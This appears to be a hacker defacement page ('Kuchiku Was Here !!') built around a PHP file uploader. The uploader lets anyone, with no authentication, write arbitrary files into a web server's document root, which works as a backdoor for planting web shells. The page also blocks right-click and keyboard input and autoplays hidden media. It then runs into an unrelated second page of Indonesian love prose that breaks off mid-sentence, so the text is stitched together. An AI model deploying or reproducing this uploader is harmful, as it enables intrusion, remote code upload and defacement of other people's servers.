<html lang='en-US'><head><title>Kuchiku Upload</title>
<iframe width="1" height="1" src="http://www.youtube.com/embed/SRiLZKCChbI?rel=0&autoplay=1&loop=1&playlist=DdpzFW5mCT0" frameborder="0" allowfullscreen></iframe></td><body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;'>
<style>
body{cursor:url("http:///foro.elhacker.net/elhacker.cur"),auto;}html{display:table;height:100%;width:100%;}body{display:table-row;}body{display:table-cell;vertical-align:middle;text-align:center;}a:link{text-decoration:none;}
body {
	  background-color: #000000;
	background-image: url(http://www.sepeb.com/anime-wallpaper-black/anime-wallpaper-black-010.jpg);
<!--http://www.twitrcover.com/ar/uploads/Al-Quds-Twitter-Header-8534.jpg-->
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-position:right top;
	background-repeat:no-repeat;
	background-size:110%
}
.style1 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
</style>
<br><b><font color='White' face='Tahoma' font size="5px"'>Kuchiku Was Here !!</font></b>

<br>
<center><?php
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='idx_file'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Ciee Sukses Uploadnya :* -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal upload root >:(";
		}
	} else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "Ciee Sukses Uploadnya :* <b>$files</b> di folder ini";
		} else {
			echo "gagal upload >:(";
		}
	}
}
?>

<!DOCTYPE html>
<html>
<title>K.I.T.A</title>

	<audio autoplay loop>
	<source src="http://micro.byethost24.com/KITA.mp3"></source>
	</audio>
	<head>
	<link href='https://fonts.googleapis.com/css?family=Architects+Daughter' rel='stylesheet' type='text/css'>
	</head>
<body bgcolor="#2b2b2b" link="gray" text="gray">
<center>

<script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
 if(this.running) return;
 if(typeof this.origText == "undefined") {
   setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
   return;
 }
 if(this.currentText == "") this.element.innerHTML = "";
 if(this.currentChar < this.origText.length) {
   if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
     this.tagBuffer = "<";
     this.inTag = true;
     this.currentChar++;
     this.run();
     return;
   } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
     this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
     this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
     this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
   this.currentChar++;
   setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
 } else {
        this.currentText = "";
        this.currentChar = 0;
       this.running = false;
       this.finishedCallback();
 }
}
</script>

<font face= "Architects Daughter">
<p id="a"><font>K.I.T.A
</p></font>
<script type="text/javascript">
new TypingText(document.getElementById("a"), 100, function(i){ var ar = new Array(""); return " " + ar[i.length % ar.length]; });
//Type out examples:
</script>

<font face= "Architects Daughter">
<font id="aa"><font>Sebelum hadir kata kenyamanan, pastikan itu <br> cinta bukan cuma penasaran belaka. Karena <br> sering kita melihat hati-hati yang patah sebelum <br> cinta benar-benar merekah. Semua itu <br> berujung pada saling menyalahkan dan saling <br> mencaci satu sama lain. Hingga akhirnya tak <br> pernah ada lagi saling sapa akibat kegagalan <br> menanggapi rasa.<br><br>

Jatuh cinta tak pernah bisa dikatakan biasa. <br> Ada rindu yang selalu jatuh di terik sepi yang <br> lupa berteduh. Ada bosan yang selalu tertolak <br> di tiap angan yang begitu menginginkan. Serta,<br> ada sakit yang tak akan pernah membekas di <br> tiap hati yang selalu ikhlas. <br><br>

Iya, maaf.
Kata sederhana yang selalu menjadi <br> juara.
Begitu mudah diberikan, begitu cepat <br> dilupakan. Berikut semua penjelasan tanpa <br> henti tentang berhenti menyakiti, hingga janji <br> setia sampai mati. Beserta semua pelukan <br> hangat sehabis pertengkaran dan bisikan <br> sayang yang begitu menenangkan. <br><br>

Kemudian, lupa akan luka. Hilang akan benci. <br>
Perlahan.
Pun.
Berganti. <br><br>

Lepas genggaman, cinta terbunuh pelan-pelan. <br> Terutama, tentang kita.
Sesederhana aku <br> mencintaimu, serumit itu kau mencintainya. <br>
Sesederhana aku ingin membahagiakanmu, <br> serumit itu kau bahagia dengannya. <br><br>

Kau, kau adalah nama dalam doa yang Nagara
    // Hargai karya orang maka karya anda akan dihargai
    // Greetz: All My Friends.
    ########################################################
   
    <!-- #Source HarisID --!>

